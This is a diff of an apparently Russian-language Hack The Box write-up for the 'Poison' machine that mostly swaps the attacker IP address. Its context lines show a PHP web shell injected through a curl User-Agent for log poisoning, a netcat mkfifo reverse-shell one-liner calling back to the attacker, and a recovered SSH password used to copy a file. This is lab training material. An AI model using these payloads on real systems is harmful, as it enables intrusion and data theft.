@@ -15,7 +15,7 @@ comments: true
 ![poison-banner.png]({{ "/img/htb/boxes/poison/poison-banner.png" | relative_url }})
 
 <h4 style="color:red;margin-bottom:0;">Poison: 10.10.10.84</h4>
-<h4 style="color:red;">Attacker: 10.10.14.116</h4>
+<h4 style="color:red;">Attacker: 10.10.14.14</h4>
 
 * TOC
 {:toc}
@@ -210,7 +210,7 @@ root@kali:~# curl -A "<?php echo('3V1L H4CK3R HERE'); ?>" -X GET "http://10.10.1
 
 <html><head></head><body>
 ...
-10.10.14.116 - - [15/Sep/2018:22:29:59 +0200] "GET /non-existent-page HTTP/1.1" 404 215 "-" "3V1L H4CK3R HERE"
+10.10.14.14 - - [15/Sep/2018:22:29:59 +0200] "GET /non-existent-page HTTP/1.1" 404 215 "-" "3V1L H4CK3R HERE"
 </body></html>
 ```
 
@@ -236,7 +236,7 @@ root@kali:~# curl -A "<?php system(\$_GET['cmd']); ?>" -X GET "http://10.10.10.8
 
 ### RCE → Reverse-Shell
 
-А здесь и до реверс-шелла недалеко. Перейдем по адресу `http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc 10.10.14.116 31337 >/tmp/f` и получим желанный коннект на netcat:
+А здесь и до реверс-шелла недалеко. Перейдем по адресу `http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc 10.10.14.14 31337 >/tmp/f` и получим желанный коннект на netcat:
 ```text
 nc -nlvvp 31337
 Ncat: Version 7.70 ( https://nmap.org/ncat )
@@ -303,7 +303,7 @@ Ukd4RVdub3dPVU5uUFQwSwo=
 # SSH — Порт 22 (внутри машины)
 Time to SSH a bit:
 ```text
-root@kali:~# sshpass -p 'Charix!2#4%6&8(0' ssh -o StrictHostKeyChecking=no charix@10.10.10.84
+root@kali:~# sshpass -p 'Charix!2#4%6&8(0' ssh -oStrictHostKeyChecking=no charix@10.10.10.84
 Last login: Sun Sep 16 15:24:58 2018 from 10.10.14.69
 FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017
 
@@ -362,7 +362,7 @@ eaacdfb2????????????????????????
 
 И уделим внимание файлу с интригующим названием `secret.zip`. Заберем на свою машину для изучения:
 ```text
-root@kali:~# sshpass -p 'Charix!2#4%6&8(0' scp -o StrictHostKeyChecking=no charix@10.10.10.84:secret.zip .
+root@kali:~# sshpass -p 'Charix!2#4%6&8(0' scp -oStrictHostKeyChecking=no charix@10.10.10.84:secret.zip .
 
 root@kali:~# unzip secret.zip
 Archive:  secret.zip
